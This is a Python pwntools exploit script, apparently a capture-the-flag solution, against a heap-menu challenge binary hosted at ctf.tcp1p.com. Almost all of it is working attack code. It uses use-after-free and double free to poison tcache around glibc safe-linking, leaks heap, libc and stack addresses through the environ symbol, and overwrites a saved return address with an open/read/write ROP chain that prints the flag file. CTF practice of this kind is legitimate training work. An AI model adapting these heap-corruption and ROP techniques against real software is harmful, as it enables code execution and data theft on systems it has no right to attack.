#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from os import path
import sys
from ctypes import CDLL
from libnum import n2s, rev_grey_code, s2n

# ==========================[ Information
DIR = path.dirname(path.abspath(__file__))
EXECUTABLE = "/main"
TARGET = DIR + EXECUTABLE 
HOST, PORT = "ctf.tcp1p.com", 49999
REMOTE, LOCAL = False, False

# ==========================[ Tools
elf = ELF(TARGET)
elfROP = ROP(elf)

# ==========================[ Configuration
context.update(
    arch=["i386", "amd64", "aarch64"][1],
    endian="little",
    os="linux",
    log_level = ['debug', 'info', 'warn'][2],
    terminal = ['tmux', 'split-window', '-h'],
)

# ==========================[ Exploit

def get_rand():
    global rand_list
    return rand_list.pop(0)

def verif_name(p):
    strlen = lambda x : len(p.split(b"\x00")[0])
    length_p = strlen(p)
    p = p[:length_p][::-1]
    
    tmp_rand_list = [get_rand() for _ in range(length_p)]
    current_rand = get_rand()
    modulo_rand = current_rand % length_p

    p_val = s2n(p)
    for _ in range(modulo_rand):
        p_val = rev_grey_code(p_val)
    tmp_data = n2s(p_val)
    p = b"".join([p8((tmp_rand_list[i]&0xFF)^tmp_data[i]) for i in range(len(tmp_rand_list))])
    return p

def add(idx, data):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b": ", str(idx).encode())
    io.sendafter(b": ", data)
    print("ADDED", idx)

def delete(idx):
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b": ", str(idx).encode())
    print("DELETED", idx)

def edit(idx, name=b"A\x00", data=b"\x00", write_data=True):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b": ", str(idx).encode())

    print("EDIT/VIEW", idx)
    if write_data is not True:
        name = verif_name(b"Vaints\x00")  # static wrong name
        io.sendafter(b": ", name) 
        io.recvuntil(b"this ticket belongs to ")
        resp = io.recvuntil(b"1. ", drop=True)
        return resp
    else:
        name = verif_name(name) 
        io.sendafter(b": ", name)
        io.sendafter(b": ", data)


def obf(pos, ptr):
    return (pos >> 12) ^ ptr

def exploit(io, libc=null, cdll=null):
    if LOCAL==True:
        #raw_input("Fire GDB!")
        if len(sys.argv) > 1 and sys.argv[1] == "d":
            choosen_gdb = [
                "source /home/mydata/tools/gdb/gdb-pwndbg/gdbinit.py",     # 0 - pwndbg
                "source /home/mydata/tools/gdb/gdb-peda/peda.py",          # 1 - peda
                "source /home/mydata/tools/gdb/gdb-gef/.gdbinit-gef.py"    # 2 - gef
                ][2]
            cmd = choosen_gdb + """
            # b *verify+0x158
            # b *$rebase(0x161f)
            # b *$rebase(0x165c)
            # b *$rebase(0x1665)
            # b *verify+0x17e

            # b *$_base()+0x1845
            # b *$_base()+0x181f
            # b *$rebase(0x1661)
            b *order+0x7c
            disable breakpoints 1
            c
            """
            gdb.attach(io, gdbscript=cmd)


    FLAG_LOCATION = b"/proc/self/cwd/flag.txt\x00" # given by the probset
    # used for ORW ROP later
    if LOCAL:
        open_fd = 3 
    elif REMOTE:
        open_fd = 5

    add(0, b"AAAA\x00")
    add(1, b"BBBB\x00")
    add(2, b"CCCC\x00")
    add(3, FLAG_LOCATION) # also used for preventing chunk consolidate with top chunk

    delete(0)
    # tcachebins [0x30]: CHUNK_0 (CHUNK_0 will contain : CHUNK_0 address >> 12)

    resp = edit(0, write_data=False)
    print(resp)
    LEAKED_HEAP = u64(resp.ljust(8, b"\x00")) << 12
    HEAP_BASE = LEAKED_HEAP - 0x1000
    print("LEAKED_HEAP              :", hex(LEAKED_HEAP))
    print("HEAP_BASE                :", hex(HEAP_BASE))
    CHUNK = []
    for i in range(4): # 0 - 3
        CHUNK.append(LEAKED_HEAP + 0xe30 + (0x30*i))

    print("CHUNK[0]                 :", hex(CHUNK[0]))
    print("CHUNK[1]                 :", hex(CHUNK[1]))
    print("CHUNK[2]                 :", hex(CHUNK[2]))
    print("CHUNK[3]                 :", hex(CHUNK[3]))

    add(0, b"AAAA")

    delete(0)
    edit(0, p64(obf(LEAKED_HEAP, 0)), p64(0)+p64(0xdeadbeef))
    delete(0)

    edit(0, p64(obf(CHUNK[0], CHUNK[0])), p64(obf(CHUNK[0], HEAP_BASE+0x10)))
    add(0, p64(obf(CHUNK[0], HEAP_BASE+0x10)))
    p = b""
    p += p16(0) # 0x20
    p += p16(1) # 0x30
    p += p16(0) # 0x40
    p += p16(0) # 0x50
    p += p16(0) # 0x60
    p += p16(0) # 0x70
    p += p16(0) # 0x80
    p += p16(7) # 0x90 (fill counts a.k.a tcachebins counter for 0x90 bins )

    add(4, p)

    delete(1)
    edit(1, p8(0x06), p64(obf(CHUNK[1], CHUNK[0]-0x10)))
    add(1, p64(obf(CHUNK[1], CHUNK[0]-0x10)))
    add(5, p64(0)+p64(0x30*3 + 1))

    delete(0) # unsorted bin

    resp = edit(0, write_data=False)
    LEAKED_LIBC = u64(resp.ljust(8, b"\x00"))
    libc.address = LEAKED_LIBC - 0x1f6ce0
    print("LEAKED_LIBC                  :", hex(LEAKED_LIBC))
    print("libc.address                 :", hex(libc.address))
    print(f"{hex(libc.symbols['environ'])=}")

    # used up unsorted bins 
    add(0, b"AAAA\x00")
    add(1, b"BBBB\x00")
    add(2, b"CCCC\x00")

    delete(0) # delete 0, to give an
    delete(1)
    
    # overwrite the bk pointer 
    edit(1, p64(obf(CHUNK[1], CHUNK[0])), p64(0)+p64(0xdeadbeef))
    
    # double free
    delete(1) 
    edit(1, p64(obf(CHUNK[1], CHUNK[1])), p64(obf(CHUNK[1], libc.symbols["environ"]-0x10)))
    add(1, p64(obf(CHUNK[1], libc.symbols["environ"]-0x10)))

    add(6, b"B"*(0x10-1)+b"|")
    resp = edit(6, write_data=False)
    LEAKED_STACK = u64(resp.split(b"|")[1][:6].ljust(8, b"\x00"))
    STACK_SAVED_RIP_ORDER = LEAKED_STACK - 0x160
    print("LEAKED_STACK             :", hex(LEAKED_STACK))
    print("STACK_SAVED_RIP_ORDER    :", hex(STACK_SAVED_RIP_ORDER))


    delete(1)
    delete(2)
    
    edit(2, p64(obf(CHUNK[2],CHUNK[1])), p64(obf(CHUNK[2], STACK_SAVED_RIP_ORDER&~0xF)))
    add(1, b"DUMMY")
    p = b""
    p += p64(STACK_SAVED_RIP_ORDER-0x20)
    p += p64(libc.search(asm("pop rdi; ret;")).__next__())
    p += p64(STACK_SAVED_RIP_ORDER-0x20)
    p += p64(libc.symbols["gets"])
    
    add(7, p)

    p = b""
    p += p64(libc.search(asm("pop rdi; ret;")).__next__() + 1) * 8 # ret sled
    p += p64(libc.search(asm("pop rdi; ret;")).__next__())
    p += p64(CHUNK[3]) # FLAG_LOCATION
    p += p64(libc.search(asm("pop rsi ; pop r15 ; ret")).__next__())
    p += p64(0)
    p += p64(0)
    p += p64(libc.search(asm("pop rdx ; pop rbx ; ret")).__next__())
    p += p64(0)
    p += p64(0)
    p += p64(libc.search(asm("pop rax; ret;")).__next__())
    p += p64(2)
    p += p64(libc.address + 0x8bee6) # syscall ; ret

    p += p64(libc.search(asm("pop rdi; ret;")).__next__())
    p += p64(open_fd)
    p += p64(libc.search(asm("pop rsi ; pop r15 ; ret")).__next__())
    p += p64(CHUNK[3])
    p += p64(0)
    p += p64(libc.search(asm("pop rdx ; pop rbx ; ret")).__next__())
    p += p64(0x200)
    p += p64(0)
    p += p64(libc.search(asm("pop rax; ret;")).__next__())
    p += p64(0)
    p += p64(libc.address + 0x8bee6) # syscall ; ret

    p += p64(libc.search(asm("pop rdi; ret;")).__next__())
    p += p64(1)
    p += p64(libc.search(asm("pop rsi ; pop r15 ; ret")).__next__())
    p += p64(CHUNK[3])
    p += p64(0)
    p += p64(libc.search(asm("pop rdx ; pop rbx ; ret")).__next__())
    p += p64(0x200)
    p += p64(0)
    p += p64(libc.search(asm("pop rax; ret;")).__next__())
    p += p64(1)
    p += p64(libc.address + 0x8bee6) # syscall ; ret

    io.sendline(p)


    io.interactive()

if __name__ == "__main__":
    io, libc = null, null

    if args.REMOTE:
        REMOTE = True
        io = remote(HOST, PORT)
        # libc = ELF("./libc.so.6")
        
    else:
        LOCAL = True
        io = process(
            [TARGET, ],
            env={
            #     "LD_PRELOAD":DIR+"/___",
            #     "LD_LIBRARY_PATH":DIR+"/___",
            },
        )
        # libc = ELF("___")
        # libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
    libc = ELF("./libc.so.6") # patched
    cdll = CDLL("/lib/x86_64-linux-gnu/libc.so.6")
    rand_list = [cdll.rand() for _ in range(1000)]
    exploit(io, libc, cdll)
